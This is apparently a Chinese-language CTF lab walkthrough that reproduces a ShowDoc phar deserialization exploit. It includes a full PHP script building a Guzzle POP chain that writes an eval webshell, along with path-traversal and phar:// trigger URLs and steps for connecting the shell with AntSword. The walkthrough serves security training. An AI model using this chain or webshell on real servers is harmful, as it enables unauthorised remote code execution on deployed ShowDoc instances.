#  漏洞复现 | Showdoc反序列化   
知识土拨鼠  掌控安全EDU   2024-07-13 12:00  
  
码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
# 本文由掌控安全学院 - 知识土拨鼠 投稿  
  
**来****Track安全社区投稿~**  
  
**千元稿费！还有保底奖励~（https://bbs.zkaq.cn）**  
  
非常简单的一个靶场  
  
**靶场地址：https://hack.zkaq.cn/**  
  
打开靶场，弹出了这种登录框，这也成为了后面的一个坑点，记住这个登录框。![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51Ib7QWfCkSq3HCkUvujdjDrSLWQ9hzo2DAYziaQAwxedPzraaibvGaU3g/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51z9fJnPx7ASG8s4Ib0JskWZibj6Ra3yA0oBiazywSSHDialsiam9SxhpUPA/640?wx_fmt=png&from=appmsg "")  
看到了注册功能，showdoc有注册功能我们就不用尝试前台SQL注入了，直接注册就行（题目中的SQL注入多少有点滑稽..）。如果平时遇到了showdoc没有注册功能的，师傅们可以用p牛大佬的注入exphttps://github.com/vulhub/vulhub/blob/master/showdoc/3.2.5-sqli/poc.py接着打靶，登录后台，来到文件库![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51ia6nq5KZZmxEhM6gZQZKfxnCCYKPr5ib4hMJb2SNVT93Q60D3KJ9Xmlg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51rjsfNyuRxmPQ1vKs1DjBneV8ouibVrdR0IU3FJxxOUkxPqyicdf7Q7fg/640?wx_fmt=png&from=appmsg "")  
尝试直接读取flag/server/index.php?s=/../../../../flag.txt直接爆出了绝对路径![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo514KXBaMGxJcsOALmqA3ibPzMXCllibkIkIm5hRtfXWYLvQQlOG3R2GflA/640?wx_fmt=png&from=appmsg "")  
拿我们开始准备生成Phar的脚本，exp.php:  
```
<?php

namespace GuzzleHttp\Cookie{

    class SetCookie {
        private static $defaults = [
            'Name'     => null,
            'Value'    => null,
            'Domain'   => null,
            'Path'     => '/',
            'Max-Age'  => null,
            'Expires'  => null,
            'Secure'   => false,
            'Discard'  => false,
            'HttpOnly' => false
        ];
        function __construct()
{
            $this->data['Expires'] = '<?php @eval($_POST["cmd"]);?>';
            $this->data['Discard'] = 0;
        }
    }

    class CookieJar{
        private $cookies = [];
        private $strictMode;
        function __construct() {
            $this->cookies[] = new SetCookie();
        }
    }

    class FileCookieJar extends CookieJar {
        private $filename;
        private $storeSessionCookies;
        function __construct() {
            parent::__construct();
            $this->filename = "/var/www/html/server/3.php";
            $this->storeSessionCookies = true;
        }
    }
}

namespace{
    $pop = new \GuzzleHttp\Cookie\FileCookieJar();
    $phar = new \Phar("flag.phar");
    $phar->startBuffering();
    $phar->setStub('GIF89a'."__HALT_COMPILER();");
    $phar->setMetadata($pop);
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
}
```  
  
本地启动phpstudy，把exp.php在本地环境运行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51HwRfQTpicY2FiamCQ7zBAY1awl8yTQkzvK6iaWVMwJremSK5uIs9jBibEQ/640?wx_fmt=png&from=appmsg "")  
成功生成flag.php![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51E0H6boMXn0iccgUUTdmcXicdX6pmqqasJMG9IJvNW13JC35q9TibicNRfA/640?wx_fmt=png&from=appmsg "")  
注意：1.制作phar包时需要修改php.ini文件如下：  
  
[Phar]; http://php.net/phar.readonlyphar.readonly = Off; http://php.net/phar.require-hashphar.require_hash = Onphar.cache_list =  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51o0zH7pzDdYEeHWwt17TYbxviaJP9EAZ1LbQ9KyjFgxc8rNarNlwUssg/640?wx_fmt=png&from=appmsg "")  
然后把flag.phar文件改名为flah.png，会有文件上传检测上传后，点击查看获取到文件路径![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51Muhib8A9fVh0Sicm1kTW5APj8wIzJWo029lDpXDXXsqZXyeOCmjmqrAQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51IQnXwI0gz85hcPNcU1YtIkYkIciaOGIjVINz3DB0icBJ6SRgCUhawIRA/640?wx_fmt=png&from=appmsg "")  
然后访问/server/index.php?s=home/index/new_is_writeable&file=phar://../获取到的文件路径触发phar反序列化  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51ukbicQke1sE0hiaXr3kCy9xg8OrlW3xFbwvUAb27yp5WUOKvXelfsQlg/640?wx_fmt=png&from=appmsg "")  
成功触发页面是空白，然后访问我们写入马子的位置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51Vu1LvVom0hSlq0kPPBElic1Gia8ia9JyxH6ibpjzPr2GNwL4f3Guf3ic0gw/640?wx_fmt=png&from=appmsg "")  
成功写入木马，但是这里有些人可能会连不上木马，像这样爆红  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51n6Ua3aolXy2Gj5HOqfeyt5vVAq66ibicVts8t4lq9lVkkrUunk2wEYdA/640?wx_fmt=png&from=appmsg "")  
原因就是最开始的访问网页的认证登录框，我们重新开一个浏览器对比一下登录和没有登录区别。没有登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51a75NGOtdpdyCNRRWH6QDsPUgezNy1dsFauK8sd6naMfmx6a2GcRbpg/640?wx_fmt=png&from=appmsg "")  
登录成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51BaNuZKficBVbImyiaRRGUbveYQRfbAmAPp4AGPCJfdnSOT7BXyXAhVZg/640?wx_fmt=png&from=appmsg "")  
区别就是登录成功后带上了Authorization，所以我们在蚁剑中添加上这样的请求头，即可成功连接![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51hn9t7QXGQokl1gibfwZ9C0whw9qwykib2JHSkPCIDs1ZYILvkzhwE1QQ/640?wx_fmt=png&from=appmsg "")  
获取flag![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcqp1c3jjcUj6T0B6Qbxwo51KVaXnib1lvBxmN1KwFhgGTNuU6DlLbSSicXLmlSAuvFTqOR6MibapBAFw/640?wx_fmt=png&from=appmsg "")  
  
```
```  
  
  
  
